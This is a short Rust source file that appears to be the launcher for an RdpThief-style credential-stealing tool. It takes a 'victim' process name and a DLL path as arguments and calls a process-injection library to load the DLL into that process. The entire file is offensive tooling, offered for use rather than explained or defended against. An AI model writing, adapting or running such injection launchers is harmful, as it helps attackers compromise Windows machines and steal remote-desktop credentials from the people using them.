use process_injection::*;
use reqwest::{self, Error};
use std::env;
use windows_sys::Win32::Foundation::CloseHandle;

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        println!("Invalid number of args");
        println!("RdpThief.exe victim.exe dll.dll");
        return;
    }
    let victim = &args[1];
    let dll = &args[2];
    match inject_dll(victim.to_string(), dll.as_str()) {
        Ok(h) => println!("Process has been injected: {}", unsafe { CloseHandle(h) }),
        Err(e) => println!("Error during injection: {:?}", e),
    }
}
